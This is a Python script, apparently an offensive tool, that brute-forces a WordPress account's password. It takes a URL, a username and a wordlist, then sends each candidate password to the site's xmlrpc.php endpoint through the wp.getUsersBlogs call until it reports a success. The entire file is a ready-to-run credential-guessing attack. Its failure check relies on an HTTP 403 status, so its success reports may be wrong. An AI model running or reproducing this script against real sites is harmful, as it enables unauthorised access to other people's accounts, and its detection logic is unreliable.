import requests
import argparse
from xml.etree import ElementTree as ET

def send_request(url, username, password):
    headers = {'Content-Type': 'application/xml'}
    data = f"""<methodCall>
                <methodName>wp.getUsersBlogs</methodName>
                <params>
                    <param><value>{username}</value></param>
                    <param><value>{password}</value></param>
                </params>
            </methodCall>"""
    response = requests.post(url, headers=headers, data=data)
    return response

def check_failure(response):
    if response.status_code == 403:
        try:
            xml_response = ET.fromstring(response.content)
            if xml_response.find('.//faultCode') is not None and xml_response.find('.//faultCode').text == '403':
                return True
        except ET.ParseError:
            pass
    return False

def main():
    parser = argparse.ArgumentParser(description='Fuzzing XMLRPC for Wordpress')
    parser.add_argument('-u', '--url', required=True, help='The URL to fuzz')
    parser.add_argument('-w', '--wordlist', required=True, help='Path to the wordlist file')
    parser.add_argument('-username', required=True, help='Username for login')
    args = parser.parse_args()

    # Ensure /xmlrpc.php is at the end of the URL
    base_url = args.url if args.url.endswith('/xmlrpc.php') else f'{args.url.rstrip("/")}/xmlrpc.php'

    with open(args.wordlist, 'r') as file:
        for line in file:
            password = line.strip()
            response = send_request(base_url, args.username, password)
            if not check_failure(response):
                print(f'Success! Password: {password}')
                break
            else:
                print(f'Failed attempt with password: {password}')

if __name__ == '__main__':
    main()

